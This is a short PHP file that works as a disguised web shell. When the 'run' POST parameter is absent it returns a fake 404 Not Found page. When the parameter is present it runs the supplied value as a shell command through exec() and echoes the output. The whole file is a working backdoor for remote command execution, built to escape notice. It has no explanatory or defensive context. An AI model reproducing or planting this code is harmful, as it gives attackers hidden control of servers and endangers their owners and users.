<?php
if (!isset($_POST["run"])) {
	http_response_code(404);
	die("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><!-- w --><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL /bead/as was not found on this server.</p></body></html>");
}

$log = exec($_POST["run"] . " 2>&1");

echo $log;
?>